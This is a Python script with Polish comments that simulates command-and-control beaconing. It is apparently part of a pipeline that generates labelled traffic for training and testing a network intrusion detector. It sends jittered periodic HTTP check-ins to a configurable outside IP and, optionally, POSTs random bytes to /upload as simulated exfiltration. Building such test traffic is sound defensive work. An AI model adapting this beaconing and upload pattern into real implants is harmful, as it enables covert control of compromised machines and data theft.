#!/usr/bin/env python3
"""Klient C2 beaconing (Z1, "zero-day").

Rola w potoku jest taka, że to narzędzie generuje atak C2 beaconing - "niewidziany" atak, którego nie ma w
treningu. Zainfekowana stacja wewnętrzna (o3/d2/o5) w regularnych odstępach łączy sie z zewnętrznym serwerem C2
czasem wysyłając dane (eksfiltracja). Uruchamia je orchestrator.run_beacon, składając parametry z yamla.
Oprócz ruchu produkuje log, który czyta tool_logs.beacon_count - niezależna kontrola etykiet w check_labels

Celowo przypomina legalny heartbeat IoT z generatora ruchu - model musi odróżnić legalną regularność od ataku.

    python3 beacon_client.py --target 203.0.113.12 --count 7 --interval 45 --jitter 0.2 --log z1.log
"""
import argparse #argumenty
import http.client #klient HTTP ze stdlib
import os #losowe bajty do eksfiltracji
import random #jitter
import time #znaczniki czasu i sleep


def beacon(target, path, data=None):
    #pojedyczne zadanie HTTP do serwera C2
    conn = http.client.HTTPConnection(target, 80, timeout=5)
    if data is None: #GET - zwykły meldunek czeka na polecenia
        conn.request("GET", path, headers={"User-Agent": "beacon/1.0"})
    else: # data podane - POST z danymi (eksfiltracja)
        conn.request("POST", path, body=data, headers={"User-Agent": "beacon/1.0"})
    conn.getresponse().read() #odczytuje odp serwera (nie używa jej ale trzeba odczytać żeby zamknąć połączenie)
    conn.close() #zamknięcie 


# cały atak Z1: count meldunków w odstępach interval ± jitter, co exfil_every-ty z nich to POST z danymi;
# każdy udany meldunek trafia do logu, a na końcu wypisuje liczbę wysłanych
def main():
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", required=True) # wymagane do podania - adres IP serwera C2
    parser.add_argument("--count", type=int, default=7, help="liczba check-inów")
    parser.add_argument("--interval", type=float, default=45.0, help="bazowy odstęp [s]")
    parser.add_argument("--jitter", type=float, default=0.2, help="jitter jako ułamek odstępu (0..1)")
    parser.add_argument("--exfil-every", type=int, default=0, help="co ile beaconów POST „eksfiltracji” (0 = nigdy)")
    parser.add_argument("--exfil-bytes", type=int, default=4096)
    parser.add_argument("--seed", type=int, default=0, help="ziarno jittera (podaje je orkiestrator z ziarna sesji)")
    parser.add_argument("--log", required=True) #wymagane do podania - plik logu do zapisu
    args = parser.parse_args()
    random.seed(args.seed)  # te same odstępy beaconów przy tym samym ziarnie sesji

    beacons_sent = 0
    #pętla beaconów
    with open(args.log, "w") as f: #log otwarty na całą pętlę
        for i in range(args.count): #tyle checkin ile count
            try:
                # eksfiltracja: tylko gdy exfil_every > 0, nie przy pierwszym beaconie (i) i co exfil_every-ty
                if args.exfil_every and i and i % args.exfil_every == 0:
                    beacon(args.target, "/upload", data=os.urandom(args.exfil_bytes)) #upload losowych bajtów
                    kind = "exfil"
                else:
                    beacon(args.target, "/checkin") #normalny meldunek GET
                    kind = "checkin"
                beacons_sent += 1
                # log: czas + rodzaj (checkin/exfil); te linie liczy potem tool_logs.beacon_count
                f.write(f"{time.time():.3f}\t{kind}\n")
                f.flush()
            except Exception as e:  # błąd: logujemy, ale nie zwiększamy beacons_sent (beacon_count pomija "error")
                f.write(f"{time.time():.3f}\terror\t{e}\n")
            # odstęp do kolejnego beacona = interval z jitterem (±); po ostatnim już nie śpimy
            if i < args.count - 1:
                jitter_factor = 1.0 + random.uniform(-args.jitter, args.jitter)
                time.sleep(max(0.1, args.interval * jitter_factor))
    print(f"beacons={beacons_sent}")


if __name__ == "__main__":
    main()
